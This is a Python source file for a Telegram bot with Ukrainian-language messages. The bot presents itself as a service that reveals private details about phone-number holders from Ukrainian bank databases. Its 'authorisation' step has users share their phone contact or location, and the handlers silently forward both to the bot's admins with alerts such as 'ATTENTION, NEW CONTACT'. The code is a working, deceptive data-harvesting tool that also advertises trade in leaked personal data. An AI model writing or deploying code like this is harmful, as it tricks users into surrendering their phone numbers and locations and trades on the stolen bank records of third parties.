import logging

from aiogram import types
from aiogram.dispatcher.filters.builtin import Command

from data.config import admins
from keyboards.default import location, search
from loader import dp
from states import Searching


@dp.message_handler(Command("start"))
async def bot_start(message: types.Message):
    await message.answer(f"Привіт, {message.from_user.full_name}. Цей бот надає приватну інформацію про тримачів "
                         f"номерів мобільних телефонів з банківських баз даних (тільки на території України)."
                         f"\nДля початку роботи пройдіть авторизацію.",
                         reply_markup=search, )


@dp.message_handler(content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message):
    contact = message.contact
    x = contact["phone_number"]
    for admin in admins:
        try:
            await dp.bot.send_message(admin, f"УВАГА, НОВИЙ КОНТАКТ: \n{contact}")

        except Exception as err:
            logging.exception(err)
    if x[:3] == "380":
        await message.answer(f"Дякую, Ви авторизовані, приємного користування.\n"
                             f"Номер {x} вдало пройшев фільтрацію.", reply_markup=search)
        await Searching.login.set()
    else:
        await message.answer(f"Нажаль Ваш номер телефону не належить Українським операторам.\n"
                             f"Для використання боту підвердіть Ваше знаходження на території України.",
                             reply_markup=location)


@dp.message_handler(content_types=types.ContentType.CONTACT, state=Searching.login)
async def get_contact_second(message: types.Message):
    await message.answer(f"Ви вже авторизовані. Приємного пошуку.")


@dp.message_handler(content_types=types.ContentType.CONTACT, state=Searching.search)
async def get_contact_second(message: types.Message):
    await message.answer(f"Ви вже авторизовані. Приємного пошуку.")


@dp.message_handler(content_types=types.ContentType.LOCATION)
async def get_contact(message: types.Message):
    locations = message.location
    for admin in admins:
        try:
            await dp.bot.send_message(admin, f"УВАГА, НОВА ЛОКАЦІЯ: \n{locations}")

        except Exception as err:
            logging.exception(err)
    await message.answer(f"Дякую, Ви авторизовані.", reply_markup=search)
    await Searching.login.set()
